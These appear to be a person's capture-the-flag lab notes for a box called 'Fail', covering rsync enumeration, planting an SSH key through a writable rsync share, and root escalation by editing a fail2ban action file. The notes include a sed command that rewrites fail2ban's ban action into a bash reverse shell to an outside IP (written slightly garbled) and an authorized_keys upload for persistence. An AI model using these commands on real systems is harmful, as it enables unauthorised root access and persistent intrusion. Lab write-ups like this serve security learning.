# Fail Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Fail-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks completed
      

![](reping.png)
searchsploit-rsync.png
sudo nmap -p- -oA nmap/rerescan-script-typo-All-TCP-slow --min-rate 10 192.168.229.126
https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
https://youssef-ichioui.medium.com/abusing-rsync-misconfiguration-to-get-persistent-access-via-ssh-2507d4a1690b
https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/


phindwhatrsynccantdo.png



bannerandmanenum.png

correctway.png

```bash
nc -nv $ip 873
@RSYNCDL: 31.0 # Server sends this just send it back
# Enumerate files - `#list` 
#list 
# If the send back a directory if @RSYNCD: AUTHREQD then password is required

# Similarly with rsync
rsync -av --list-only rsync://$ipaddress

# SSH Key syncing - https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/

ssh-keygen -f testkey
cat testkey.pub > authorized_keys


rsync -av .ssh rsync://192.168.193.126/fox

# /etc/rsyncd.secrets


rsync -vAXogEp  ./bash rsync://192.168.193.126/fox



```

whathashitisaskaiforthefirsttime.png

```
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
```

Very normal crons
![](cronacronalong.png)

failedintothessh.png

```
fox@fail:/dev/shm$ find / -group fail2ban 2>/dev/null | grep -v '/run/\|/proc/\|/sys/' | xargs -I {} grep -r -e 'ass' {}
```

Itriedtouploadbashwithdifferentperms.png

The password does not crack...


Hint taken: Check your group membership and what processes are run on schedule. Enumerate the relevant directory. Then, abuse an action to get a shell.


```bash
# root will only be allowed to run this just for methodological thoroughness
fox@fail:/dev/shm$ which fail2ban 
# Path is not controllable
echo $PATH | tr -s ':' '\n'
/usr/local/bin
/usr/bin
/bin
/usr/local/games
/usr/games

fox@fail:/dev/shm$ find / -type d -group fail2ban -perm -o+w 2>/dev/null
/etc/fail2ban* # ARE not writable 
fox@fail:/dev/shm$ find / -type d -name *fail2ban* -ls 2>/dev/null
```

Triple check encase it is ever 5 minutes
whatwhereandwhy.png

Trying to work if /sbin/init that is symlinked to systemd is misconfigured
```
fox@fail:/dev/shm$ ps -o uid= -p $(pidof /sbin/init)
```

systemdessnut.png

pushphindtoaitheansweriamnotdorking.png

HELPED-THROUGHED because I am too ill and stress TO ONCE AGAIN READ THE GROUP PERMISSIONS FOR THE 3rd+ box in the last 3 months atleast

```

ls -l /etc/fail2ban/

cat /etc/fail2ban/README.fox 
# Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!


ls -l /etc/fail2ban/action.d

cat /etc/fail2ban/jail.conf

sed -i 's@actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>@actionban = bash -i \>\& \/192.168.45.217\/4444 0\>\&1@g' /etc/fail2ban/action.d/iptables-multiport.conf


```


theyearofthefacepalmandreadthegrouppiditisnotjustyouruser.png


pain.png

I would have never probably thought trying to ban mmy own ip so I need to reconfigure the way I think still on this issue. State of mind regardless 

